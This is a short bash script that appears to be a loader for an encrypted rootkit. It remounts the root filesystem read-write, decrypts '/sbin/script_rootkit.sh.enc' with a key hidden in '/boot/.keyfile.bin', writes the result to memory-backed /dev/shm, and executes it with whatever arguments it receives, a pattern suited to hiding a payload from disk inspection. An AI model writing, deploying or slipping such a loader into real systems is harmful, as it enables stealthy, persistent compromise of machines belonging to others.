#!/bin/bash
mount -o remount,rw /
openssl enc -d -aes-256-cbc -pbkdf2 -in "/sbin/script_rootkit.sh.enc" -out "/dev/shm/script_rootkit.sh" -pass file:"/boot/.keyfile.bin"
chmod +x /dev/shm/script_rootkit.sh
exec /dev/shm/script_rootkit.sh "$@"
